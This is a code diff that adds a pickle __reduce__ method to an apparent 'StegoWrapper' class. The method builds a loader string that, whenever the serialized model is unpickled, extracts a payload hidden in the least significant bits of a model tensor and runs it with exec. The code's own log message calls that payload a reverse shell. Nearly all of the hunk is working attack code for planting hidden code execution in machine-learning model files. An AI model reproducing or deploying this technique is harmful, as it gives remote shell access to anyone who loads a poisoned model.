@@ -290,3 +290,51 @@ class StegoWrapper(Middleware):
         # Embed the decode_lsb function source code
         # Note: here we're using inspect.getsource so we don't have to copy and paste
         decode_lsb_source = f"{inspect.getsource(decode_lsb)}"
+
+        # Embed necessary data
+        pickled_state_dict_literal = repr(self.pickled_state_dict_bytes)
+        embedded_target_key = repr(self.target_key)
+        embedded_num_lsb = self.num_lsb
+        print(
+            f"  [Reduce] Embedding {len(self.pickled_state_dict_bytes)} bytes of pickled state_dict."
+        )
+
+        # Construct the loader code string
+        loader_code = f"""
+import pickle, torch, struct, traceback, os, pty, socket, sys, subprocess
+print('[+] StegoWrapper: Loader code execution started.', file=sys.stderr); sys.stderr.flush()
+{decode_lsb_source}
+print('[+] StegoWrapper: Embedded decode_lsb function defined.', file=sys.stderr); sys.stderr.flush()
+pickled_state_dict_bytes = {pickled_state_dict_literal}
+target_key = {embedded_target_key}
+num_lsb = {embedded_num_lsb}
+print(f'[+] StegoWrapper: Embedded data retrieved (state_dict size={{len(pickled_state_dict_bytes)}}, target_key={{target_key!r}}, num_lsb={{num_lsb}}).', file=sys.stderr); sys.stderr.flush()
+try:
+    print('[+] StegoWrapper: Deserializing embedded state_dict...', file=sys.stderr); sys.stderr.flush()
+    reconstructed_state_dict = pickle.loads(pickled_state_dict_bytes)
+    if not isinstance(reconstructed_state_dict, dict):
+        raise TypeError("Deserialized object is not a dictionary (state_dict).")
+    print(f'[+] StegoWrapper: State_dict reconstructed successfully ({{len(reconstructed_state_dict)}} keys).', file=sys.stderr); sys.stderr.flush()
+    if target_key not in reconstructed_state_dict:
+        raise KeyError(f"Target key '{{target_key}}' not found in reconstructed state_dict.")
+    payload_tensor = reconstructed_state_dict[target_key]
+    if not isinstance(payload_tensor, torch.Tensor):
+         raise TypeError(f"Value for key '{{target_key}}' is not a Tensor.")
+    print(f'[+] StegoWrapper: Located payload tensor (key={{target_key!r}}, shape={{payload_tensor.shape}}).', file=sys.stderr); sys.stderr.flush()
+    print(f'[+] StegoWrapper: Decoding hidden payload from tensor using {{num_lsb}} LSBs...', file=sys.stderr); sys.stderr.flush()
+    extracted_payload_bytes = decode_lsb(payload_tensor, num_lsb)
+    print(f'[+] StegoWrapper: Payload decoded successfully ({{len(extracted_payload_bytes)}} bytes).', file=sys.stderr); sys.stderr.flush()
+    extracted_payload_code = extracted_payload_bytes.decode('utf-8', errors='replace')
+    print('[!] StegoWrapper: Executing final decoded payload (reverse shell)...', file=sys.stderr); sys.stderr.flush()
+    exec(extracted_payload_code, globals(), locals())
+    print('[!] StegoWrapper: Payload execution initiated.', file=sys.stderr); sys.stderr.flush()
+
+except Exception as e:
+    print(f'[!!!] StegoWrapper: FATAL ERROR during loader execution: {{e}}', file=sys.stderr);
+    traceback.print_exc(file=sys.stderr); sys.stderr.flush()
+finally:
+    print('[+] StegoWrapper: Loader code sequence finished.', file=sys.stderr); sys.stderr.flush()
+"""
+        print("  [Reduce] Loader code string constructed with escaped inner braces.")
+        print("  [Reduce] Returning (exec, (loader_code,)) tuple to pickle.")
+        return (exec, (loader_code,))
